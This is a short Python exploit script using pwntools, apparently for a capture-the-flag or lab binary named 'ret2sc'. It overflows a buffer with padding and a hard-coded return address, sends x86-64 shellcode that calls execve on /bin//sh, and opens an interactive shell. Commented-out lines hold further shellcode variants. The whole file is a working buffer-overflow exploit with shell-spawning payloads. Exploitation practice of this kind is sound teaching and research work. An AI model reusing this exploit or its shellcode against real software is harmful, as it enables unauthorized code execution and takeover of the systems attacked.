from pwn import *

p = process( './ret2sc' )

p.recvuntil( '> ' )
payload = b'a' * 24 + p64( 0x0000000000601080 )
p.sendline( payload )

p.recvuntil( '> ' )

#hello = bytes( [ 0xeb, 0x19, 0x59, 0xb8, 0x04, 0x00, 0x00, 0x00, 0xbb, 0x01, 0x00, 0x00, 0x00, 0xba, 0x06, 0x00, 0x00, 0x00, 0xcd, 0x80, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xcd, 0x80, 0xe8, 0xe2, 0xff, 0xff, 0xff, 0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x06 ] )
#sh = bytes( [ 0xeb, 0x12, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x5f, 0xbe, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xe9, 0xff, 0xff, 0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x5c, 0x78, 0x30, 0x30, 0x09 ] )
#print( len(hello), hello )
#sh = '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
sh = bytes( [  0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x53,  0x54, 0x5f, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x0f, 0x05 ] )
raw_input()
p.sendline( sh )

p.interactive()